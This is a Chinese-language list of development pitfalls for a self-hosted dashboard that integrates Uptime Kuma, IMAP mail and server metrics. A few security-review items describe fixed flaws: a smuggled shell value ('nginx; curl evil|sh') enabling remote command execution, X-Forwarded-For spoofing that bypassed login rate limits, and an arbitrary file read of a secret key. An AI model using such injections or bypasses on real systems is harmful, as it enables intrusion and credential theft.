## 坑清单

1. SQLite 建表语句每条必须以 `;` 结尾，否则 `db.exec` 报 `near "CREATE": syntax error`。
2. pnpm 12 不再读 package.json 的 `pnpm` 字段，构建脚本白名单只能写在 `pnpm-workspace.yaml` 的 `allowBuilds`（否则 esbuild 被拦，`ERR_PNPM_IGNORED_BUILDS`）。
3. 资产「备注」字段叫 `notes`，关联便签叫 `linkedNotes`，两者不能同名（曾导致 TS 冲突 + 抽屉崩溃）。
4. 标签正则必须包含中文标点前缀，否则「。\#整理」识别不到。
5. 命令面板容器必须 `position: fixed`（.palette-wrap），否则会被 flex 布局挤到侧边。
6. 无鉴权，仅限本机使用。（2026-10-21 起已内置登录鉴权，但「只监听 127.0.0.1、公网必须走反代 + HTTPS」这条不变。）
7. **搬动目录后第一次 `pnpm start` 会报 `ERR_PNPM_PACKAGE_MANAGER_REMOVE_MODULES_DIR` / `Failed to remove modules directory contents: 拒绝访问 (os error 5)`**：pnpm 发现 `node_modules` 的虚拟 store 路径变了，会尝试重装又删不掉。解法是 `Remove-Item .\node_modules -Recurse -Force` 后重新 `pnpm install`（有本地 store，1–2 秒完成）。2026-10-19 搬目录时就踩了这个；当晚再搬到 `D:\pinfolio` 时**先删 `node_modules` 再搬**（该目录里 245 个 junction 全是旧绝对路径，搬完必断），搬后 `pnpm install` 2.9 秒装回 103 个包、零下载。
8. **观测页大片「待定」+「检查 40+ 分钟前」= Kuma 假死，不是 pinboard 的问题**：Kuma 用 SQLite 单连接池，被一条语句占住后所有接口挂起，日志刷 `KnexTimeoutError: Timeout acquiring a connection`。先看 `D:\kuma\logs\kuma.log` 尾部，有这条就 `D:\kuma\tools\kuma.ps1 restart`（细节见 `D:\kuma\OBS-NOTES.md` 坑 #9）。pinboard 侧只会如实显示旧心跳。
9. **观测台不能每次请求都 `?fresh=1` 直捅 Kuma**：Kuma 的 `/api/status-page/obs` 在它自己 5 分钟缓存过期那一刻、又正好赶上 12 个探测在跑时，实测要 **5–30 秒**才回（心跳接口只要几十毫秒）。早期版本前端每次加载都带 `fresh=1` + 后端 8 秒超时，结果服务重启后缓存为空 → 超时 → 502 → 页面渲染成空态，看起来就是「观测页是空的」。现在的做法：清单缓存 5 分钟并预热、心跳按需取、超时 25 秒、失败沿用旧值，前端只在手动刷新时传 `fresh=1`。
10. **`tools/pinboard.ps1` 必须存成 UTF-8 带 BOM**：`start.cmd` / `stop.cmd` 是用 `powershell`（Windows PowerShell 5.1，不是 pwsh 7）调它的，无 BOM 时它按 GBK 解码 → 中文全乱 → 报 `Unexpected token '...' in expression or statement` 并把整份判成语法错误、一行都不执行（2026-10-20 改后台启动时踩过：`stop.cmd` 直接跑不起来，只剩一句 `Press any key to continue`）。重写该文件用 `[System.IO.File]::WriteAllText($f,$t,[System.Text.UTF8Encoding]::new($true))`。⚠️ **agent 的 `edit`/`write` 工具写出的文件一律无 BOM**（2026-10-20 改 `Show-Logs` 时被静默剥掉，脚本当场 ParseError 且 stdout 全空、只有 stderr 有错）——每次编辑完都要检查/补回 BOM：`([System.IO.File]::ReadAllBytes($p))[0..2] -join ','` 必须是 `239,187,191`。`run-pinboard.vbs` 则**必须 CRLF**（同 kuma）。
11. **弹层别只往一个方向展开**：`.content` 是 `overflow-y:auto` 的滚动容器，任何往上顶出它上边界的绝对定位弹层都会被裁掉，而且滚不回来（scrollTop 不能为负）。`.tag-pop` 2026-10-21 就踩了这个（被遮住一半）。以后加同类弹层，要么像 `CommandPalette` 用 `position: fixed`，要么照 `openTagMenu()` 的写法量剩余空间选方向。
12. **邮件页一行 `STORE` 都不许有**（需求 NFR-5 / 决策 D1：在这里看完，回原邮箱必须仍是未读）。只读是两层保证：`getMailboxLock(folder, { readOnly: true })` 以 EXAMINE 打开信箱 + imapflow 的 `fetch`/`fetchOne` 天生用 `BODY.PEEK`。**别为了「点开就标已读」去加 `messageFlagsAdd`/`STORE +FLAGS \\Seen`**——那就是回写服务器；「本页看过」只能写本地 `mail_local_read`。
13. **163 必须发 `IMAP ID` 才能打开收件箱**（否则服务器回 `Unsafe Login`）：imapflow 登录时会按服务器 capability 自动补发，代码里不用手写，但**别把 `makeClient()` 里的 `clientInfo: { name:'pinboard', ... }` 删掉**——删了 163 就登不进去。
14. **远程图片是默认加载的（D4 反转了 FR-20），只有用户点「隐藏图片」时才在 DOMPurify 之前把 `src` 摘成 `data-src`**：DOMPurify 默认保留 `<img src>`，若先清洗再摘，`data-src` 会被 `FORBID_ATTR`/`ADD_ATTR` 规则吃掉，隐藏就形同虚设、追踪像素照样被请求。顺序必须是「DOMParser 摘 src → DOMPurify」。另外**别再给被拦图片注入 `alt="图片已拦截"`**——17 张图就刷 17 遍 alt 文字，用户 2026-10-21 反馈「全是图片已拦截」就是这么来的；占位交给 CSS `img[data-blocked]` 的虚线框。
15. **列表分页不能糊成无限滚动**：FR-11 要求「能一直翻到最早一封」，`listMessages()` 是游标式归并（每账号 UID 倒序 50 封一批、多账号取队头比时间、`offset` 跳过已展示项、`hasMore` 表示还有），改算法前先跑 `tests/e2e-mail.mjs` 的翻页断言（「最后一页下一页禁用」是边界）。
16. **邮件测试要单独装假 IMAP 服务器**：`tests/fakeimap/` 有**自己的一份 `package.json`**（hoodiecrow-imap + imapflow + mailparser），它的 `node_modules` 不是项目依赖；清过 `tmp/` 或换机器后先 `cd tests/fakeimap; npm install`。跑 `node tests/e2e-mail.mjs` 需要 7788 上的 pinboard 已经在跑（脚本自己 `startFakeImap(120)` 起在随机端口，不需要真邮箱）。⚠️ 两个测试脚本开头都会清账号，**已改成只删 host 是 `127.0.0.1`/`localhost` 的假 IMAP 账号**（真实账号只 `console.warn` 跳过），且都支持 `MAIL_E2E_BASE` 指向隔离实例——**有真实 Gmail 账号在库里时，务必用隔离实例跑**：`$env:PINBOARD_DATA='D:\pinfolio\tests\e2e-data'; $env:PORT='7799'; pnpm start`，再 `$env:MAIL_E2E_BASE='http://127.0.0.1:7799'; node tests/e2e-mail.mjs`。跑完删掉 `tests/e2e-data`。
17. **列表摘要必须清洗**：`snippetFromText()` 吃的是 IMAP 的 `TEXT` 分支前 800 字（`bodyParts maxLength`），真实邮件里会带 `[image: xxx]` / `[cid:xxx]` 内嵌图占位符、Outlook 条件注释 `<!--[if mso]>`，甚至因为 800 字截断而**留下没有收尾的半截注释**，营销邮件还会塞一堆 `U+034F` 零宽字符撑预览。这些在列表里全是脏字，已在 `snippetFromText()` 里统一剥掉（成对注释 → 到文末的残注释 → `<!…>` → 残留标签 → `[image:|cid:]` → 零宽字符 → 折叠空白），单测 `tests/snippet-test.mts`（`npx tsx tests/snippet-test.mts`）。**别改成「先 slice(0,240) 再清洗」**——那又会切出半截注释。
18. **自动刷新（D5）是「可见才轮询」，改它之前先看清三条**：① 轮询必须走 `fresh=1`——否则 60 秒的 `LIST_TTL` 缓存会把新信挡在外面，看着像「轮询没生效」；② 轮询只能静默（`fetchList(..., silent=true)`）——一旦 `setLoading(true)`，用户正读着信列表会闪成「正在取信…」，且 `setLoading` 抖动会牵动底部翻页条；③ 判断「页面在不在前台」用 `document.visibilityState`，**不要**用 `window.onfocus`（切换显示器/点开发者工具都会误判）；④ 轮询会一直重跑，effect 的依赖只放 `accounts.length`/`accountsLoaded`/`fetchList`/`fetchAccounts`，**别把 `offset`/`items` 塞进去**（每翻一页/每来一封就重建定时器）；⑤ `?poll=毫秒` 是留给测试和调参的开关，e2e 用 `?poll=1500` 才能在十几秒内验完，别为了测试去改 `POLL_MS` 常量。
19. **邮件正文渲染必须走 Shadow DOM，且宿主上的后代选择器是死代码**：邮件 CSS 是全局作用域，直接塞进主文档会污染便签夹（试过删掉所有内联 `style` 来隔离，结果营销邮件的表格排版全崩——用户 2026-10-21 报「排版给我修正」）。现在 `root.innerHTML = docHtml` 进 shadow，`styles.css` 里 `.mail-html` 只能写宿主自身（`display/min-width`），写 `.mail-html .mail-doc{…}` 一条都不会生效。`fitWidth()` 的 `ResizeObserver` **只能按宽度变化重算**——zoom 会改高度，按尺寸全触发会自激抖动。测邮件页**别用 `waitUntil:'networkidle'`**（`/api/mail/accounts?counts=1&fresh=1` 走真 IMAP 会挂 30s 超时），用 `domcontentloaded` + `waitForSelector('.mail-row')`，Gmail 偶发超时就重跑；取正文要查 `.mail-doc`（Playwright 的 CSS 选择器能穿透 shadow），`.mail-html` 宿主的 `textContent` 是空的。

20. **「立即观测」不能调 Kuma 的 `restartMonitor`**：那是 `kuma/server/server.js:1925` 的内部函数，**socket 上根本没有这个事件**（`socket.on` 只有 editMonitor / getMonitorList / getMonitor / resumeMonitor / pauseMonitor / deleteMonitor）。`server/kuma/client.ts` 的 `kickCheck()` 走的是 `resumeMonitor`（server.js:1090）→ startMonitor → 立刻 safeBeat，几百毫秒内就有新心跳；`runKumaCheck()` 先取 `getBeats(id,1)` 末条时间当基线，再 400ms 轮询等新心跳。**推送型（push）不适用**——它要等 `setTimeout(interval)` 才探，所以没配方就置灰。
21. **`editMonitor` 是全量覆盖，且 `toJSON()` 比它读的字段少两个**：`kuma/server/server.js:801-994` 逐字段 `bean.X = monitor.X`，**少传一个字段等于把它清空**，所以 PATCH 必须先 `getMonitor` 拿整 bean、只改要改的几个字段、再整体回传。更要紧的是 `monitor.toJSON()`（`kuma/server/model/monitor.js:120`）**不返回 `showMsg` 和 `manual_status`**：直接回传会让 `Boolean(undefined)` = false 把 `show_msg` 静默清成 0（本机 19 项全是 `showMsg:false` 才没暴露），现在 PATCH 里从状态页列表按 id 补 `showMsg`。另外 `accepted_statuscodes` 要字符串数组、`conditions` 要数组、`policyJson` 要**字符串或 null**（`toJSON` 故意不 parse，别在前端当成对象改）。
22. **Kuma 的状态页有 5 分钟 apicache，写操作后列表不会立刻变**：`kuma/server/routers/status-page-router.js:34` 的 `cache("5 minutes")`，而 `apicache.clear()` 只在删除观测项和重要心跳变化时触发（改名字/改频率/暂停都不清）。绕过头是 `kuma/server/modules/apicache/apicache.js:760` 认的 `x-apicache-bypass: 1`。所以 `invalidate()` 除了清模块级 cache/statusCache/beatCache，还要设 `statusBypassUntil = Date.now() + 15000`，让随后 15 秒的取数都带这个头——**别把这段删掉**，否则改名/暂停后界面 5 分钟内纹丝不动，看着像没保存。
23. **删除前备份 Kuma 库必须用 `VACUUM INTO`，不能直接复制文件**：`kuma/data/kuma.db` 是 WAL 模式，最近的写入还在 `kuma.db-wal` 里，单复制 `.db` 会丢一段。`backupDb()` 用 `new DatabaseSync(KUMA_DB)` 执行 `VACUUM INTO '<target>'` 得到一致的快照，失败才退回「连 `-wal` 一起复制」。备份放 `kuma/backups/kuma-YYYYMMDD-HHMMSS.db`，只留最近 5 份；**这个目录可能一开始就不存在**，要 `mkdirSync(recursive)`（e2e 里统计备份数也要容忍目录缺失）。
24. **`kuma/SNAPSHOT.md` 不是自动生成的**：它靠 `node kuma/tools/snapshot.cjs` 手动跑（`kuma.ps1 snapshot`），Kuma 改观测项不会自己刷新。pinboard 每次写成功后 `refreshSnapshot()` 防抖 1.5 秒 spawn 一次（`cwd: KUMA_DIR`、`stdio:'ignore'`、`unref()`）。`snapshot.cjs` 的 `@louislam/sqlite3` 按文件位置解析，所以 cwd 设不设都能跑，但设成 `KUMA_DIR` 更稳。
25. **改名要扫策略引用，因为策略能按名字引用别的观测项**：`kuma/server/model/policy.js:387` 用 `monitorStatus.name` + `nameToId` 解析依赖。`policyNameRefs()` 递归 walk 每个观测项的 `policy_json`（字符串先 `JSON.parse`，坏 JSON 忽略）收集 `monitorStatus.name`，命中就 409 拒绝改名并说明是谁引用。**别把这条删掉**——当前 #27 是 `{"gate":{"when":{"monitorStatus":{"id":3,"is":"UP"}}}}` 按 id 引用不受影响，但用户以后完全可能按名字配。
26. **观测项的写接口一律要 `Content-Type: application/json`**（CSRF 防护：跨站表单发不出 JSON，只能发 urlencoded/text，所以非 JSON 直接 415；DELETE 只在**带 body** 时才校验，因为不带 body 的 DELETE 本来就是简单请求）。连带后果：`web/lib/api.ts` 里 pause / resume / check 这三个没有参数的 POST **也必须传 `body: JSON.stringify({})`**，否则请求不带 Content-Type、服务端回 415。
27. **e2e 造临时观测项要按 `kuma/tools/kuma-monitor.cjs` 的规矩来**：`node tools/kuma-monitor.cjs add <payload.json> [--group N] [--inactive]`，payload 模板见 `kuma/tools/payloads/http.json`，**`active:true` 才会真的跑探测**（`--inactive` 只负责把 active 改成 false，不能反过来）。测试中途失败会**泄漏临时观测项**（曾留下 29/30/31/32 四个），跑完务必 `del <id>` 清掉，否则观测台里多出「e2e 临时A」之类的卡片。

28. **异常通知的三条硬约束别改**：① 轮询**不能带 `fresh=1`**——那等于每 30 秒直捅一次 Kuma 状态页，正好撞上它 5 分钟缓存过期时要 5–30 秒（坑 9），观测页会连带卡死；② `stale: true` 的响应必须**整轮跳过**——Kuma 假死时后端沿用旧值并标 stale，若照旧值判定，会把所有通知当成「已恢复」全部关掉，用户就再也看不到告警；③ 首轮只当基线——否则打开页面瞬间，历史里所有红的项会一起炸出来。另外 `.alert-stack` 必须 `position: fixed`（`.content` 是滚动容器，绝对定位会被裁，见坑 11）。

29. **Gmail 直连被墙时只能靠账号级代理，别去改全局环境变量**：本机 `imap.gmail.com:993` 直连会 10 秒超时（`:443` 也不通），而 `imap.qq.com` / `imap.163.com` 正常 —— 这表现为邮件页红条「连接超时」，**不是密码错**。修法就是账号里的 `proxy` 字段：① imapflow **原生支持** `proxy: 'socks5://127.0.0.1:10808'`（`dist/cjs/proxy-connection.js`，依赖里自带 `socks`），**不要为此加新依赖或自己包一层 socket**；② `mail_accounts.proxy` 加列必须走「`PRAGMA table_info` 查一遍、缺列才 `ALTER TABLE`」的迁移，否则老库启动就崩；③ 写建表 SQL 时**每行结尾逗号别漏**——漏了会报 `Error: near "enabled": syntax error` 让整个服务起不来（本次踩过）；④ `normalizeAccountInput()` 里 `proxy === undefined` 必须表示「不改」，只有传空字符串才清成直连，否则前端表单漏传字段就会把用户配好的代理静默清掉；⑤ 代理挂了要能看懂：`friendlyError(err, proxy)` 必须把「经代理 socks5://…」写进文案（并用 `proxyLabel()` 去掉 URL 里的账号密码），否则用户只会看到一句「连接超时」又回头怀疑密码。账号抽屉里「代理（可选）」留空 = 直连，只填 `127.0.0.1:10808` 会自动补 `socks5://`。

30. **隔离实例（`PINBOARD_DATA` 指到别处）只隔离数据库，不隔离项目根下的生成物**：跑邮件 e2e 时用 `PORT=7799` + `PINBOARD_DATA=tests\e2e-data` 起了个空库实例，它启动时 `writeSnapshot()` 拿**空库**生成了一份 1 KB 的 `SNAPSHOT.md`，把真库那份 40 KB 的覆盖掉了（2026-10-21 踩过，`pnpm snapshot` 才补回来）。现在的护栏在 `server/snapshot/write.ts`：`const ISOLATED = DATA_DIR !== join(ROOT, 'data')`，隔离实例直接跳过写入并打一行 warn。**再加「项目根下的自动生成物」时（导出文件、缓存、报告），一律照这个判断加护栏**，别只想着数据库。

31. **卡片/行里的悬浮弹层一律 `createPortal` 到 `document.body` + `position: fixed`，不许在卡片里写绝对定位**（2026-10-22 心跳色条悬停提示踩的，和坑 11、坑 28 同根）：`.content` 是 `overflow-y: auto` 的滚动容器，卡片里 `position: absolute` 往上弹的框会被它裁掉，而且滚不回来；`.asset-card` / `.monitor-card` 自己以后加 `overflow: hidden`（比如圆角裁图）也一样会裁。做法见 `web/components/BeatStrip.tsx`：`createPortal(<div className="beat-tip" style={{position:'fixed',left,top}}/>, document.body)`，`left` 夹在 `[TIP_EDGE, innerWidth - TIP_EDGE]`、色条离视口上沿小于 `TIP_FLIP` 就改成往下弹（`translate(-50%, 0)`），`pointer-events: none` 免得挡住点卡片，再监听 `scroll`（**capture: true**，滚动不冒泡）与 `resize` 收起（否则滚动后提示框飘在原地）。**顺手把原生 `title` 摘掉**（`title={hasDetail ? undefined : title}`），否则浏览器自带 tooltip 会跟自己画的框同时冒出来。

32. **悬停会改变布局的元素，别用鼠标坐标反推它是第几个**（2026-10-22 色条放大动画踩的，和坑 31 是同一处代码）：心跳色条悬停时那一段 `flex-grow` 变大、把邻居挤开，如果还按 `clientX` 除以等宽去算「第几拍」，边界会跟着动画一起动 —— 鼠标被算到邻居身上、邻居又变大、再算回来，**抖成一片**（40 段时每段才 4~5px，一点点位移就跨段）。正确做法是让鼠标自己说：`ev.target` 落在哪个 `<i>` 上就取它的 `data-i`（划在 2px 缝隙上时**保持原状不闪**，不要退回几何算法）；提示框锚点也改成那一段自己的 `getBoundingClientRect()` 中心 —— 变宽是绕中心进行的，中心不动。**同理**：任何 hover/focus 会改自己或邻居尺寸的组件（折叠行、放大按钮、拖拽把手），索引/命中判断都必须取自事件目标，不能取自坐标反推。
33. **`data/metrics.json` 的 `base` 里带拉取 token，任何写回都必须「读-改-原子写」，不许整份覆盖**（2026-10-22 加主机管理时定的）：`base` 形如 `https://metrics.example.com/metrics/<token>`，丢了只能去服务器上翻 `/etc/node-metrics.conf` 或 nginx 日志才能找回来。`server/metrics/config.ts` 的 `saveHosts()` 只替换 `hosts` 键（`mergeMetricsFile()` 保留 `base` 与所有未知键），先写 `<file>.tmp` 再 `renameSync` 覆盖，最后 `resetMetricsConfig()` 清缓存。**别改成「构造一个新对象整体 `JSON.stringify` 写回」**（token 当场丢），也**别改成 `writeFileSync` 原地写**（写到一半崩了就是半个 JSON，六台机全掉线）。

34. **主机页的「暂停」只是本机不再拉取，不等于停掉采集**：服务器上的 `node-metrics.timer` 照旧每 5 分钟 PUT，磁盘上的 JSON 一直在更新；恢复时 `PATCH {paused:false}` 会立刻拉一次，但**中间那段曲线是空的**（只能补到最新一帧），要真停得去那台机 `systemctl disable --now node-metrics.timer`。配套两条别改回去：① `pollAll()` 必须过滤 `paused`，否则「暂停」名不副实；② `pollFailed` 必须过 `visibleFailures()`，并且**要求这台机至少有过一帧样本** —— 否则删掉一台机、或刚加一台还没装采集端的机，红条会一直挂在那儿（2026-10-22 第一轮实测发现）。

35. **弹层（`position: fixed` + `backdrop-filter`）不要用 fullPage 截图验收**：2026-10-22 看 `DeleteHostModal` 的 fullPage 截图时，弹窗里透出了背后的卡片文字，一度以为 `.modal-card` 的背景被写成了半透明；实际上 element 截图是干净的，canvas 读像素 center / upper / lower 全是 `246,243,236`（`--paper` 的 `#f6f3ec`，完全不透明），计算样式 `op 1` —— **是截图 / 预览管线在合成 fixed 层时的假象**。验收弹层一律用**视口截图**（`page.screenshot()` 不带 `fullPage`），有疑问就直接读像素，别凭缩略图去改 CSS。

36. **真实 token 不许出现在仓库文件里，而 `read` 工具会把 32 位十六进制串遮成 `<TOKEN>`**（2026-10-22 收尾复查踩的）：`tools/node-metrics/nginx-metrics.conf` 里那两段 `location` 一直带着真 token（第 7、17 行），`read` 出来显示的是占位符，`grep -rl '<token>'` 却能命中 —— **查密钥一律用 `grep`，别信 `read` 的显示**。这个仓库是公开的，提交即泄露。现在文件里是 `<TOKEN>` 占位；token 只允许出现在 `data/metrics.json`（`.gitignore` 第 3 行 `data/`，不进版本库）与服务器上的 `/etc/node-metrics.conf`、nginx 配置里。**加新脚本/文档时带 token 的示例一律写 `<TOKEN>`**。

37. **从 Git Bash 用 `curl -d '{"label":"中文"}'` 发中文，服务端收到的是 U+FFFD**（2026-10-22 接口验收踩的）：Git Bash 会把命令行里的 UTF-8 字节按当前代码页再转一次，`data/metrics.json` 与 Kuma 库里都存成了 `EFBFBD`。验收带中文的写接口一律用 **node fetch**（或 `curl --data-binary @file`，文件用 `write` 工具写、别经 shell），改完再看一眼库里存的中文是否正常。

38. **采集端四件套改了之后必须重新打包单文件安装器，否则线上装的还是旧内容**（2026-10-22 加安装器时定的）：`tools/node-metrics/build-install.mjs` 把 `install.sh` / `node-metrics.sh` / `.service` / `.timer` 内联成 `node-metrics-install.sh`（分隔符 `NODE_METRICS__<NAME>__EOF`、源文件指纹写在头部）。流程是：改四件 → `node tools/node-metrics/build-install.mjs` → `--check`（逐字节比 heredoc + 指纹）→ `bash -n` → 重传到 my-server 的 `/var/www/nm/` → `curl -fsS https://metrics.example.com/nm/node-metrics-install.sh | sha256sum` 对一遍。**生成物别手改**（下次 `--check` 就红），安装器尾部也别改成 `exec`（`trap` 不跑了，`/tmp` 里的临时目录会一直留着）。

39. **删主机不能只删清单，顺带建的观测项要一起回收**（2026-10-22 加「顺带建观测项」时定的）：观测项建在 Kuma 里、地址指向这台机，主机从 `data/metrics.json` 消失后它们会一直探一个已经下线的地址（红一片）。做法：`POST /hosts` 建完把 `monitors: [id…]` 与 `group: <id>` 记进清单（`hostmeta.ts` 的 `safeMonitors` 清洗、上限 32），`DELETE ?purge=1` 时逐个 `deleteMonitor()`（失败的 id 进 `monitorsFailed` 回给前端）、组空了再 `deleteGroup()`（**组里还有观测项时 CLI 会拒绝**，所以必须放在删完之后、失败就 catch 忽略）、最后 `removeServiceRules()` 清 `host-services.json`。新建映射走 `mergeServiceRules()`（同 host+unit **覆盖** monitor id），**别追加**——追加会让 `resolveUnitMonitors` 一直命中旧 id。

40. **静态加密的主密钥丢了，邮箱密码 / Kuma 口令 / 指标源就解不开了，程序不会自己恢复**（2026-10-23 做 spec 03 时定的）：主密钥 = `PINBOARD_SECRET` 或 `data/secret.key`，`mail_accounts.password`、`data/kuma-pass.txt`、`data/metrics.json` 的 `base` 都存成 `enc:v1:<iv>:<tag>:<ct>`（`server/secrets/*`）。三条铁律：① **备份要连 `data/secret.key` 一起备**，只拷 `pinboard.db` 换台机器等于把凭据全废掉；② 密钥文件**绝不进版本库**（`data/` 已 gitignore，别为了「方便」把它挪到根目录）；③ 换密钥目前没有轮换工具——换之前先按 03 的设计写迁移，别直接改环境变量，改了之后 `open()` 解不开只会返回空密码（列表照出，收信报认证失败），别误判成 IMAP 挂了。
41. **Kuma 的 `heartbeat.time` 存的是 UTC 字符串，不是本地时间**（2026-10-26 做备份 CSV 时踩的）：格式 `YYYY-MM-DD HH:MM:SS.sss`，用 `new Date(y, m, d)` 的本地日边界去 `BETWEEN` 查，白天会查到 0 行（本地 00:00 = UTC 前一天 16:00）。正确做法是 `const utcStamp = (d: Date) => d.toISOString().slice(0, 19).replace('T', ' ')`，两端都用它（`server/backup/collect.ts`）。**别改成 `datetime(time,'localtime')`**：那会把索引查询变成全表扫描，59k 行就开始慢。

42. **远端备份表的主键别拿「实例 id + 时间戳」拼**（2026-10-26 踩的）：实例 id 本身就是 36 字符的 UUID，拼上 13 位时间戳 = 50 字符，列是 `VARCHAR(36)` → MySQL 报 `Data too long for column 'id' at row 1`，PG 直接截断/报错。用 `randomUUID()`（`server/backup/run.ts`），实例归属放 `instance_id` 列。

43. **MySQL 的 `DATETIME` 不吃 ISO 字符串**（同一天踩的）：`2026-10-25T16:28:13.643Z` 写进 `DATETIME` 报 `Incorrect datetime value`，而 PG 的 `TIMESTAMP` 又认它——两边行为不一致。备份表的 `created_at` 统一用 **`VARCHAR(32)` 存 ISO 串**（排序仍正确，页面上直接 `new Date()`），别为了「规范」改回 `TIMESTAMP`。

44. **`pg` 的 `client.query()` 返回 `{ rows, rowCount, … }`，不是行数组**（同一天踩的）：照 `mysql2` 的习惯写 `const rows = await conn.query(sql)` 会拿到对象，`rows[0]` 是 undefined——回读 sha256 校验「拿不到行」、测试连接返回空版本号，全都表现成「成功但没数据」。在 `server/backup/remote.ts` 里把 pg 的连接包一层 `query: async (sql, params) => (await client.query(sql, params)).rows`。

45. **ESM 里没有 `require()`**（同一天踩的）：`server/backup/local.ts` 第一版在函数里 `require('node:zlib')` 解 gzip，tsx 下不报错但纯 node 跑就 `require is not defined`。本项目是 `"type": "module"` + bundler 解析，一律顶层 `import`；**懒加载依赖用 `await import()`**（`mysql2` / `pg` 就是这么做的，没配远端就完全不加载）。

46. **WAL 模式下别用「拷文件」当备份或迁移前快照**（2026-10-26 做 04 的 `premigrate.ts` 时定的）：`pinboard.db` 开着 WAL，最近的事务还在 `pinboard.db-wal` 里，只 `copyFile(pinboard.db, …)` 拿到的是一份缺最新写入的旧库（本项目 `-wal` 曾经涨到 4.1 MB，见 `docs/runbook.md`）。要一致快照就用 **`db.exec("VACUUM INTO '<目标文件>'")`**（`server/backup/premigrate.ts`）或 **`node:sqlite` 的模块级 `backup(db, path)`**（`server/backup/collect.ts`）；两者都产出自包含的单文件，不需要 `-wal` / `-shm`。**注意 `DatabaseSync.prototype.backup` 是 undefined**，`backup` 只能从 `node:sqlite` 具名导入。


47. **观测项从 socket 拿回来的 bean 是 camelCase，库里的列名才是 snake_case**（2026-10-26 做 06 风味探测时踩的）：fork 的库里列叫 `policy_json`，但 `getMonitorList` 推回来的 bean 只有 `policyJson`（`server/model/monitor.js` 的 toJSON 走 camelCase），拿 `'policy_json' in bean` 判定永远 false → 自家 fork 被判成 upstream，「立即观测」整段不渲染。同理 **Hono 按注册顺序匹配**：`/meta` 必须写在 `/:id` **之前**（`server/kuma/routes.ts`），否则 `meta` 会被当成 id。

48. **反代后面取客户端 IP，要取 `X-Forwarded-For` 的最后一段**（2026-10-26 安全审查时发现的）：`server/auth/middleware.ts` 原来取第一段 `xff.split(',')[0]`，而 `docs/deploy.zh.md:51` 推荐的 nginx 写法是 `$proxy_add_x_forwarded_for`——客户端自带的值排在**最前**，真实来源追加在最后。结果是攻击者每次换一个 `X-Forwarded-For` 就是一条新 IP，登录限流（同 IP 15 分钟 5 次）等于没有：实测连续 12 次错密码全是 401，一次 429 都没触发。改成 `pickClientIp()` 取最后一段后，同样的「伪造前段 + 真实后段」5 次就 429。**只有 `TRUST_PROXY=1` 才读这个头**，直连时用 socket 地址。

49. **systemd 单元名会拼进 Kuma 的 `ssh_command`，必须卡字符集**（同一天）：`server/kuma/provision.ts` 的 `ssh_command: 'systemctl is-active ' + unit`，`unit` 来自「添加主机」的请求体，而 Kuma 在目标机上**按 shell 执行**这条命令 → `nginx; curl evil|sh` 就是远程命令执行。现在加 `const UNIT_RE = /^[A-Za-z0-9_.@:-]+$/`。凡是「把字符串拼给别处当命令跑」的地方，都按这个套路先卡白名单，别指望调用方自觉。

50. **「读私钥」的接口天然就是任意文件读取**（同一天）：`server/metrics/routes.ts` 的 `readTemplates()` 拿请求体里的 `keyPath` 直接 `readFileSync(keyPath, 'utf8')`，实测 `keyPath: 'data/secret.key'` 能读出来（内容会进 Kuma 观测项的 `ssh_private_key`）。只靠登录挡不住（单用户也会误用、也可能被 CSRF 链上），加两条：**大小 ≤ 64 KB** + **内容必须匹配 `/-----BEGIN [A-Z0-9 ]*PRIVATE KEY-----/`**。

51. **安全头只加半套，CSP 是故意留白的**（同一天）：`server/index.ts` 加了 `X-Content-Type-Options: nosniff`、`X-Frame-Options: DENY`、`Referrer-Policy: no-referrer`、`Permissions-Policy`、CSP 里的 `frame-ancestors 'none'; base-uri 'self'`，`isHttps()` 为真时再加 HSTS。**别加完整 CSP**：nginx 子路径部署靠 `sub_filter` 往 `<head>` 注入 `<script>window.__PB_BASE__</script>`（见 `web/lib/base.ts`），邮件阅读器里用户点「加载图片」也是直接把 `src` 改到远端——`script-src 'self'` / `img-src 'self'` 会同时干掉这两件事。真要上完整 CSP，得先把注入脚本改成 nonce 或独立文件。

52. **表格每行各自 grid + 最后一列 `auto`，列一定对不齐**（2026-10-26 做服务页详细视图时被用户指出的）：`.svc-row { display:grid; grid-template-columns: … 190px auto }` 写在各行上，列宽随每行内容各算各的，前面几列的起点于是逐行漂移。改法是在**卡片上**定义一次 `--svc-cols`（`.svc-card` 与 `.svc-card.is-svc` 各一套），`.svc-row, .svc-rows-head { grid-template-columns: var(--svc-cols) }` 共用，并且**最后一列给固定宽度**（24px 的换视角按钮），别再留 `auto`。验收方式：量每行每格 `getBoundingClientRect().left` 与表头对应格比对，maxDev 必须是 0。

53. **`document.documentElement.scrollHeight` 量不出滚动**（同一天）：本项目的滚动容器是 `shell.css` 里的 `.content { flex:1; overflow-y:auto }`，`documentElement` 的高度恒等于视口，于是「一屏放不放得下」永远量成「放得下」。要量 `.content` 的 `scrollHeight` vs `clientHeight`（`tools/screenshots/shot-services.mjs` 的 `metrics()` 就是这么做的，另加 `usedHeight` 量内容实际占到哪）。

54. **「每个实体一张卡」在列表视角会自己顶破一屏**（同一天）：服务视角最初照服务器视角做成卡片，23 个服务 = 23 张卡，光卡片头（标题 + IP + 条数）就吃掉 121px，比单行多出一屏（963 > 842）。**服务视角改成一个服务一行**（`.svc-slist` 两列网格，行里排部署机名），行内别再放带框的小标签——3 台机 + 长 IP（`127.0.0.1:7863`）会换行把行高撑成两倍，纯文本机名 + `·` 分隔就够。同理紧凑行不要加第二行路径：加了以后服务视角 963px 直接超出一屏。
55. **列表按「有关联才显示」过滤，会把新建的和删空的条目变没**（2026-10-26 做服务页增删改时踩到）：`groupByService` 原来只给「真部署过」的服务出行，于是页面里「加服务」保存成功、抽屉一关，那个服务**在界面上根本不出现**（统计行也不涨）；更糟的是把某个服务的最后一条部署删掉，它就再也找不到了——只能手改 JSON。凡是能在页面上新建 / 删除的实体，列表必须按**清单**出（服务视角里 0 台的也出一行，写「还没部署」+ 右边 `+` 直接挑机器），统计数字也按清单算。验收时别只看「保存没报错」，要**看得见那条新数据**、并且把关联删空之后**仍然能删掉它**。

56. **弹层截图要等 `pop` / `slide` 动画跑完**（同一天）：`overlay.css` 的 `.modal-card` 是 `animation: pop 0.18s`（`from { opacity: 0 }`），抽屉是 `slide 0.2s`。`waitForSelector('.modal')` 只等元素挂上 DOM，立刻 `screenshot()` 会拍到**半透明弹层 + 没压暗的背景**，看起来像「遮罩没生效」的 bug。脚本里在截图前 `waitForTimeout(300~350)`（或 `waitForFunction` 查 `getComputedStyle(el).opacity === '1'`）再拍。

